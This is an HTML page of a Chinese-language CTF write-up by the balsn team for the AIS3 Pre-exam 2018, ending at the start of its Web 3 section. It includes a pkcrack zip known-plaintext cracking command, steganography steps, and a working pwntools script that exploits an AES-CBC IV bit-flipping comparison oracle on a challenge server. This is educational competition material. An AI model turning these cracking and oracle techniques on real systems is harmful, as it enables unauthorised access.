@@ -1,0 +1,946 @@
+<!doctype html>
+<!--
+Modified from https://www.codeply.com/go/7XYosZ7VH5
+-->
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>AIS3 Pre-exam 2018</title>
+    <link type="text/css" rel="stylesheet" href="assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="assets/css/hljs-github.min.css"/>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/css/bootstrap.min.css" integrity="sha384-Zug+QiDoJOrZ5t4lssLdxGhVrurbmBWopoEl+M6BdEfwnCJZtKxi1KgxUyJq13dy" crossorigin="anonymous">
+    <script type="text/javascript" async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.3/js/bootstrap.min.js" integrity="sha384-a5N7Y/aK3qNeh15eJKGWxsqtnX/wWdSZSKp+81YjTmS15nvnvxKHuzaWwXHDli+4" crossorigin="anonymous"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+
+  </style>
+  
+  <script>
+// https://stackoverflow.com/a/48330533
+$(window).on('activate.bs.scrollspy', function (event) {
+  let active_collapse = $($('.list-group-item.active').parents()[0]);
+  $(".collapse").removeClass("show");
+  active_collapse.addClass("show");
+
+  let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+  $('a[href^="#submenu"]').css("border-left", "");
+  parent_menu.css("border-left","#e69138 solid 4px");
+});
+
+// http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    processEscapes: true
+  }
+});
+
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="https://github.com/balsn/ctf_writeup">
+        <img src="https://assets-cdn.github.com/images/modules/logos_page/GitHub-Mark.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">balsn / ctf_writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+          <!-- This menu is hidden in bigger devices with d-sm-none. 
+            The sidebar isn't proper for smaller screens imo, so this dropdown menu can keep all the useful sidebar itens exclusively for smaller screens  -->
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                rev
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                misc
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#misc-1">misc-1</a>
+    
+                <a class="dropdown-item" href="#misc-2">misc-2</a>
+    
+                <a class="dropdown-item" href="#misc-3">misc-3</a>
+    
+                <a class="dropdown-item" href="#misc-4">misc-4</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                web
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#web-1">web-1</a>
+    
+                <a class="dropdown-item" href="#web-2">web-2</a>
+    
+                <a class="dropdown-item" href="#web-3">web-3</a>
+    
+                <a class="dropdown-item" href="#web-4">web-4</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                crypto
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#crypto-1">crypto-1</a>
+    
+                <a class="dropdown-item" href="#crypto-2">crypto-2</a>
+    
+                <a class="dropdown-item" href="#crypto-3-(unsolved,-thanks-to-@how2hack)">crypto-3-(unsolved,-thanks-to-@how2hack)</a>
+    
+                <a class="dropdown-item" href="#crypto-4">crypto-4</a>
+    
+              </div>
+            </li>
+    
+            <!-- Smaller devices menu END -->
+        </ul>
+      </div>
+      <div class="navbar-collapse collapse w-100 order-3 dual-collapse2">
+        <ul class="navbar-nav ml-auto">
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=balsn&repo=ctf_writeup&type=star&count=true&size=large" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <!-- NavBar END -->
+    <!-- Bootstrap row -->
+    <div class="row" id="body-row">
+      <!-- Sidebar -->
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <!-- d-* hiddens the Sidebar in smaller devices. Its itens can be kept on the Navbar 'Menu' -->
+        <!-- Bootstrap List Group -->
+        <ul class="list-group sticky-top sticky-offset">
+          <!-- Menu with submenu -->
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">rev</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">misc</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#misc-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">misc-1</span>
+            </a>
+    
+<a href="#misc-2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">misc-2</span>
+            </a>
+    
+<a href="#misc-3" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">misc-3</span>
+            </a>
+    
+<a href="#misc-4" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">misc-4</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">web</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            <a href="#web-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">web-1</span>
+            </a>
+    
+<a href="#web-2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">web-2</span>
+            </a>
+    
+<a href="#web-3" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">web-3</span>
+            </a>
+    
+<a href="#web-4" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">web-4</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu4" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">crypto</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu4" class="collapse sidebar-submenu">
+            <a href="#crypto-1" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">crypto-1</span>
+            </a>
+    
+<a href="#crypto-2" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">crypto-2</span>
+            </a>
+    
+<a href="#crypto-3-(unsolved,-thanks-to-@how2hack)" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">crypto-3-(unsolved,-thanks-to-@how2hack)</span>
+            </a>
+    
+<a href="#crypto-4" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">crypto-4</span>
+            </a>
+    
+          </div>
+    
+          <!-- Separator with title -->
+        </ul>
+        <!-- List Group END-->
+      </div>
+      <!-- sidebar-container END -->
+
+      <!-- MAIN -->
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="ais3-pre-exam-2018"><a class="header-link" href="#ais3-pre-exam-2018"></a>AIS3 Pre-exam 2018</h1>
+<ul class="list">
+<li><a href="#ais3-pre-exam-2018">AIS3 Pre-exam 2018</a><ul class="list">
+<li><a href="#rev">Rev</a></li>
+<li><a href="#pwn">Pwn</a></li>
+<li><a href="#misc">Misc</a><ul class="list">
+<li><a href="#misc-1">Misc 1</a></li>
+<li><a href="#misc-2">Misc 2</a></li>
+<li><a href="#misc-3">Misc 3</a></li>
+<li><a href="#misc-4">Misc 4</a></li>
+</ul>
+</li>
+<li><a href="#web">Web</a><ul class="list">
+<li><a href="#web-1">Web 1</a></li>
+<li><a href="#web-2">Web 2</a></li>
+<li><a href="#web-3">Web 3</a></li>
+<li><a href="#web-4">Web 4</a></li>
+</ul>
+</li>
+<li><a href="#crypto">Crypto</a><ul class="list">
+<li><a href="#crypto-1">Crypto 1</a></li>
+<li><a href="#crypto-2">Crypto 2</a></li>
+<li><a href="#crypto-3-unsolved-thanks-to-how2hack">Crypto 3 (unsolved, thanks to @how2hack)</a></li>
+<li><a href="#crypto-4">Crypto 4</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><a href="https://ais3.org/">AIS3 (Advanced Information Security Summer School)</a> is a cyber security course in Taiwan. Therefore this writeup will be written in Chinese:)</p>
+<p>By @bookgin, @sces60107</p>
+<p>And thanks to @how2hack for the writeup of crypto 3!</p>
+<h2 id="rev"><a class="header-link" href="#rev"></a>Rev</h2>
+<p>@sces60107 破臺，但太忙沒空寫xD</p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn</h2>
+<p>@sces60107 太忙沒空寫也沒空打xD</p>
+<h2 id="misc"><a class="header-link" href="#misc"></a>Misc</h2>
+<h3 id="misc-1"><a class="header-link" href="#misc-1"></a>Misc 1</h3>
+<p>看題目中給的影片就有 flag 了。</p>
+<h3 id="misc-2"><a class="header-link" href="#misc-2"></a>Misc 2</h3>
+<p>這題給了一個圖片，想辦法找 flag。<img src="https://i.imgur.com/7O4997q.jpg" alt=""></p>
+<p>圖一看就知道是假 flag，但還是手賤傳了一下然後被 server 嗆 incorrect (這次的解題平台還會紀錄 flag 錯誤次數XD)，再來就是圖片分析起手式 <a href="https://github.com/zardus/ctf-tools/tree/master/stegsolve">stegsolve</a>，也沒什麼東西，而且這次一張超糊的 jpg。</p>
+<p>看來不是藏在圖片中，接下來就是 strings, binwalk, foremost，用binwalk/foremost 可以抽出一個 zip 檔，但是這個 zip 被加密了。</p>
+<p>雖然 zip 有被加密，但是檔名、資料夾結構、檔案大小沒有加密，我們發現裡面有 <code>backup/Avengers_Infinity_War_Poster.jpg</code> 跟 <code>backup/flag</code> ，這張 Avengers Infinity War Poster 把檔案名稱上網搜尋，可以找到 <a href="https://kk.wikipedia.org/wiki/%D0%A1%D1%83%D1%80%D0%B5%D1%82:Avengers_Infinity_War_poster.jpg">wiki</a> 有一張檔案名稱一樣的，連大小都一樣，在<a href="https://upload.wikimedia.org/wikipedia/kk/archive/4/4d/20180606151139%21Avengers_Infinity_War_poster.jpg">這裡。</a></p>
+<p>zip 有一種攻擊叫做 known-plaintext attack，在已知部份明文的情況下，可以算出壓縮檔案的密碼，這個在<a href="https://www.30cm.tw/2015/08/ctf-ais3-write-up.html">某一年 ais3 pre-exam 也出過</a>，用 pkcrack 就可以解開。</p>
+<p>把明文的 zip 跟路徑弄好之後執行以下指令，得到密碼為 <code>asdfghjkl;</code></p>
+<pre class="hljs"><code>./pkcrack -C flag.zip -c <span class="hljs-string">"backup/Avengers_Infinity_War_Poster.jpg"</span> -P plain.zip -p <span class="hljs-string">"backup/Avengers_Infinity_War_Poster.jpg"</span></code></pre><p>解開 zip 後得到 flag <code>AIS3{NONONONONONONONONONONO}</code>，但你以為這樣就結束了嗎？錯，這個 flag 是假的，送到解題平臺只會徒增 incorrect flag 的次數。</p>
+<p>然後我就卡在這裡，嘗試在對原本的圖片做更詳細的分析、對 zip 做詳細檢查有沒有藏東西，但都一無所獲，看著解題人數有二三十人，應該是很簡單的方向，這個 zip known-plaintext attack 卻不是 flag......</p>
+<p>最後主辦單位給出了 hint，印象中是叫我們注意  <code>AIS3{Not_this_one}</code> 第一個假 flag 的下方，請各位仔細回去看上面那張圖字的下排，你會發現跟上面明顯不對稱。@sces60107 很快發現這是摩斯密碼，我還在眼花看著高壓縮度的 jpg 不知道摩斯密碼在哪裡，看了大概五分鐘才看出來，這密碼解出來就是真的 flag 了。</p>
+<p>本題非常具有金盾獎的水準。</p>
+<p>在題目裡面放假的 flag 是還好，但這個 zip known-plaintext attack 的假 flag，讓人偏離正規解法太遠，這樣出題並不是很恰當。</p>
+<h3 id="misc-3"><a class="header-link" href="#misc-3"></a>Misc 3</h3>
+<p>題目給一個 mp3 音樂檔，聽上去就是一個人在清唱歌曲。</p>
+<p>初步 strings, binwalk, foremost 都找不出任何有用的東西。進一步就是用 audacity/sonic visualizer 開起來看波形跟 spectrogram，但也沒什麼特別的。</p>
+<p>這樣大致可以猜測這題可能是用某些專業的 audio stego 的軟體來做的，但是不知道那一款？</p>
+<p>來試試看 Google <code>svega.mp3</code> ，沒有什麼收穫......（但 @sces60107 一搜尋第一個就是 mp3stego，我猜可能是 Google 預設語言/個人偏好設定不同，導致結果差很多）</p>
+<p>那這樣只能有點無腦的暴力嘗試常見的 Audio Stego 軟體了，試了<a href="https://github.com/DominicBreuker/stego-toolkit">一些</a>都沒效，連 <a href="http://www.petitcolas.net/steganography/mp3stego/">mp3stego</a> 都試過了（用default的密碼 pass），但仔細想想覺得 mp3stego 還是最有可能的，因為他是我唯一找到 mp3 格式的 stego 軟體，但需要密碼才能解開。</p>
+<p>之前嘗試 default 的密碼 <code>PASS</code>，密碼錯誤，那來試一下密碼空白呢？果然解密成功拿到 flag 。</p>
+<h3 id="misc-4"><a class="header-link" href="#misc-4"></a>Misc 4</h3>
+<p>這題有點可惜，我賽後十分鐘才解出來，遠端的 nc 實在是太慢了 XD</p>
+<p>先附上 server 的 code：</p>
+<pre class="hljs"><code><span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
+<span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64decode
+
+key = os.urandom(<span class="hljs-number">16</span>)
+answer = int.from_bytes(os.urandom(<span class="hljs-number">16</span>), <span class="hljs-string">'big'</span>)
+
+<span class="hljs-keyword">with</span> open(<span class="hljs-string">"flag"</span>, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> data:
+    flag = data.read().strip()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypt</span><span class="hljs-params">(text)</span>:</span>
+    iv, text = text[:<span class="hljs-number">16</span>], text[<span class="hljs-number">16</span>:]
+    aes = AES.new(key, AES.MODE_CBC, iv)
+    <span class="hljs-keyword">return</span> aes.decrypt(text)
+
+print(<span class="hljs-string">"===== Welcome to number game ====="</span>)
+
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    number = decrypt(b64decode(input(<span class="hljs-string">"guess : "</span>).strip()))[:<span class="hljs-number">16</span>]
+    number = int.from_bytes(number, <span class="hljs-string">'big'</span>)
+    <span class="hljs-keyword">if</span> number &gt; answer: print(<span class="hljs-string">"Too big"</span>)
+    <span class="hljs-keyword">elif</span> number &lt; answer: print(<span class="hljs-string">"Too small"</span>)
+    <span class="hljs-keyword">else</span>: print(flag)</code></pre><p>題目會有一個答案，然後你可以給他一個數字，透過 CBC 的特性改 IV 能夠翻轉不同 bit，server 會告訴你你的數字比他大還是比他小，如果一樣就可以拿到 flag，總共有 128 bits。</p>
+<p>首先先想一下，我們有機會 bit by bit 猜嗎？</p>
+<p>如果第一個 bit 被我們猜中了，那我們在透過翻轉剩下的 127 bits，必定可以找到兩組數字，一組比答案大，一組比答案小；相反的如果我們第一個 bit 就猜錯，那無論怎麼翻轉剩下的 bits，都只會恆比答案大，或是恆比答案小。</p>
+<p>舉例來說，我們一次翻兩個 bits，即 [00, 01] 與 [10, 11]，如果其中有一組出現一大一小，那我們可以確定該組的第一個 bit 是對的。如果沒有一組出現一大一小，只好一次翻三個 bits，即 [000, 001], [010, 011], [100,101], [110,111]，這四組之中若有一組出現一大一小，那我們可以確定該組的前兩個 bits 是對的。</p>
+<p>那 worse case 的複雜度呢？假設答案是 1 ，我們原本猜測的數字是 0，那這個情況要到一次翻前127 bits 時，某一組出現 [00000...0, 00000...1]，才會發現一大一小，這個 worse case 可是有著 要翻 $2^{128}$ 次才能發現........</p>
+<p>進一步考慮 worse case 發生的情況，會發現其實沒這麼容易發生，在答案隨機的情況下，需要一次翻 10 個 bits 的發生機率為 $ 2^{-9}$ （需要考慮 0 與 1 的狀況），所以就可以利用上述方法來猜每個 bit 了。 </p>
+<p>解題 script 寫的很醜，因為解題的的當下有一段時間沒有好好睡覺了XD</p>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
+<span class="hljs-comment"># Python 3.6.5</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> base64
+<span class="hljs-keyword">import</span> string, os
+<span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> product
+
+chars = string.digits + string.ascii_letters
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">PoW</span><span class="hljs-params">(prefix)</span>:</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> product(*[chars <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>)]):
+        x = prefix + <span class="hljs-string">''</span>.join(i)
+        sha256 = hashlib.sha256()
+        sha256.update(x.encode())
+        <span class="hljs-keyword">if</span> sha256.hexdigest()[:<span class="hljs-number">6</span>] == <span class="hljs-string">'000000'</span>:
+            <span class="hljs-keyword">return</span> x
+    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"Unfortunately, PoW not found."</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">b64</span><span class="hljs-params">(n)</span>:</span>
+    <span class="hljs-keyword">return</span> base64.b64encode(n.to_bytes(<span class="hljs-number">16</span>, byteorder=<span class="hljs-string">'big'</span>) + <span class="hljs-string">b'SlowpokeIsCute&lt;3'</span>)
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">isSmall</span><span class="hljs-params">(n)</span>:</span>
+    <span class="hljs-comment">#print(s.recvuntil(b': '))</span>
+    s.sendline(b64(n))
+    r = s.recvuntil(<span class="hljs-string">'\n'</span>).decode()
+    <span class="hljs-keyword">if</span> <span class="hljs-string">'AIS3'</span> <span class="hljs-keyword">in</span> r:
+        print(r)
+        exit(<span class="hljs-number">0</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-string">'small'</span> <span class="hljs-keyword">in</span> r
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p</span><span class="hljs-params">(n)</span>:</span>
+    print(<span class="hljs-string">'{:0128b}'</span>.format(n))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess</span><span class="hljs-params">(n, idx, prefix_bits=<span class="hljs-number">0</span>)</span>:</span> <span class="hljs-comment"># BFS</span>
+    <span class="hljs-keyword">if</span> (prefix_bits == <span class="hljs-number">8</span> <span class="hljs-keyword">or</span> prefix_bits &gt; idx): <span class="hljs-comment"># oh we fail</span>
+        print(<span class="hljs-string">'fail'</span>)
+        <span class="hljs-keyword">return</span> <span class="hljs-keyword">None</span>
+    <span class="hljs-keyword">assert</span> n &amp; ((<span class="hljs-number">1</span>&lt;&lt;(idx+<span class="hljs-number">1</span>))<span class="hljs-number">-1</span>) == <span class="hljs-number">0</span>
+    <span class="hljs-keyword">for</span> prefix <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>&lt;&lt;prefix_bits):
+        x = n | prefix&lt;&lt;(idx-prefix_bits+<span class="hljs-number">1</span>)
+        print(idx, prefix_bits)
+        y = x | <span class="hljs-number">1</span>&lt;&lt;(idx-prefix_bits)
+        <span class="hljs-keyword">if</span> isSmall(x) != isSmall(y): <span class="hljs-comment"># TADA !</span>
+            <span class="hljs-keyword">return</span> (x, y), idx - prefix_bits - <span class="hljs-number">1</span>
+    <span class="hljs-keyword">return</span> guess(n, idx, prefix_bits+<span class="hljs-number">1</span>)
+
+s = remote(<span class="hljs-string">'104.199.235.135'</span>, <span class="hljs-number">20004</span>)
+pow_str = s.recvuntil(<span class="hljs-string">'x = '</span>).decode()
+x_prefix = pow_str.split(<span class="hljs-string">"'"</span>)[<span class="hljs-number">1</span>]
+ans = PoW(x_prefix)
+s.sendline(ans)
+
+s.recvuntil(<span class="hljs-string">'\n'</span>)
+idx = <span class="hljs-number">8</span>*<span class="hljs-number">16</span><span class="hljs-number">-2</span>
+n0, n1 = <span class="hljs-number">0</span>, <span class="hljs-number">1</span>&lt;&lt;<span class="hljs-number">127</span>
+<span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+    res = guess(n0, idx)
+    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> res:
+        res = guess(n1, idx)
+    <span class="hljs-keyword">assert</span> res <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">None</span>
+    (n0, n1), idx = res
+    p(n0)
+    p(n1)</code></pre><p>Flag: <code>AIS3{ag3NTs Of S.H.I.E.L.D. - I 10V3 d4Isy J0HNs0n}</code></p>
+<p>這題沒有到太難，但前兩天都沒人解，貌似是因為 timeout ，原本好像只有 150 秒的限制，後來調到 300 秒再調到 600 秒的樣子(含PoW)。</p>
+<h2 id="web"><a class="header-link" href="#web"></a>Web</h2>
+<h3 id="web-1"><a class="header-link" href="#web-1"></a>Web 1</h3>
+<p>如題目敘述，HTTP response header 就有部份 flag，寫個 script 抓一下就好。</p>
+<h3 id="web-2"><a class="header-link" href="#web-2"></a>Web 2</h3>
+<p>沒記錯的話應該是掃 robots.txt 之類的找到 <code>_hidden_flag_.php</code>，這個頁面會用 js 讓你等十幾秒，時間到了會有按鈕跑出來進入下一個頁面，這個 js 被混淆過了：</p>
+<pre class="hljs"><code><span class="hljs-keyword">var</span> _0x13ed=[<span class="hljs-string">'getElementById'</span>,<span class="hljs-string">'disp'</span>,<span class="hljs-string">'setInterval'</span>,<span class="hljs-string">'onload'</span>,<span class="hljs-string">'clearInterval'</span>,<span class="hljs-string">'innerHTML'</span>,<span class="hljs-string">'&lt;input\x20type=\x22submit\x22\x20value=\x22Get\x20flag\x20in\x20the\x20next\x20page.\x22/&gt;'</span>];(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4ff87b,_0x35e2bc</span>)</span>{<span class="hljs-keyword">var</span> _0x2c01be=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_0x216360</span>)</span>{<span class="hljs-keyword">while</span>(--_0x216360){_0x4ff87b[<span class="hljs-string">'push'</span>](_0x4ff87b[<span class="hljs-string">'shift'</span>]());}};_0x2c01be(++_0x35e2bc);}(_0x13ed,<span class="hljs-number">0x13f</span>));<span class="hljs-keyword">var</span> _0x5d44=<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">_0x592680,_0x1e9b97</span>)</span>{_0x592680=_0x592680<span class="hljs-number">-0x0</span>;<span class="hljs-keyword">var</span> _0x50206c=_0x13ed[_0x592680];<span class="hljs-keyword">return</span> _0x50206c;};<span class="hljs-keyword">var</span> left=<span class="hljs-number">0x0</span>;<span class="hljs-keyword">var</span> timer=<span class="hljs-literal">null</span>;<span class="hljs-keyword">var</span> disp=<span class="hljs-literal">null</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">countdown</span>(<span class="hljs-params"></span>)</span>{left=left<span class="hljs-number">-0x1</span>;<span class="hljs-keyword">if</span>(timer!=<span class="hljs-literal">null</span>&amp;&amp;left==<span class="hljs-number">0x0</span>){<span class="hljs-built_in">window</span>[_0x5d44(<span class="hljs-string">'0x0'</span>)](timer);timer=<span class="hljs-literal">null</span>;disp[_0x5d44(<span class="hljs-string">'0x1'</span>)]=_0x5d44(<span class="hljs-string">'0x2'</span>);}<span class="hljs-keyword">else</span>{disp[_0x5d44(<span class="hljs-string">'0x1'</span>)]=<span class="hljs-string">'('</span>+left+<span class="hljs-string">')'</span>;}}<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span>{disp=<span class="hljs-built_in">document</span>[_0x5d44(<span class="hljs-string">'0x3'</span>)](_0x5d44(<span class="hljs-string">'0x4'</span>));left=<span class="hljs-number">0xa</span>+<span class="hljs-built_in">parseInt</span>(<span class="hljs-built_in">Math</span>[<span class="hljs-string">'random'</span>]()*<span class="hljs-number">0xa</span>);timer=<span class="hljs-built_in">window</span>[_0x5d44(<span class="hljs-string">'0x5'</span>)](countdown,<span class="hljs-number">0x3e8</span>);disp[_0x5d44(<span class="hljs-string">'0x1'</span>)]=<span class="hljs-string">'('</span>+left+<span class="hljs-string">')'</span>;}<span class="hljs-built_in">window</span>[_0x5d44(<span class="hljs-string">'0x6'</span>)]=setup;</code></pre><p>事實上根本沒必要看，但我還是分析了一下，就只是 Math.random 隨機秒數之後產生 button，拿頁面上的參數送 post 去下一關。</p>
+<p>再度觀察 header (thanks to @sces60107 的提醒)，header 會告知你有沒有拿到正確的 flag，所以寫 script 一直送 request，往下一關走，判斷 header 有沒有 flag 就好，總共送個一兩萬筆 request 就能拿到 flag。</p>
+<h3 id="web-3"><a class="header-link" href="#web-3"></a>Web 3</h3>
+<p>題目 code 我沒存，但大致上是這樣:</p>
+<pre class="hljs"><code><span class="hljs-meta">&lt;?php</span>
+highlight_file(<span class="hljs-keyword">__file__</span>);
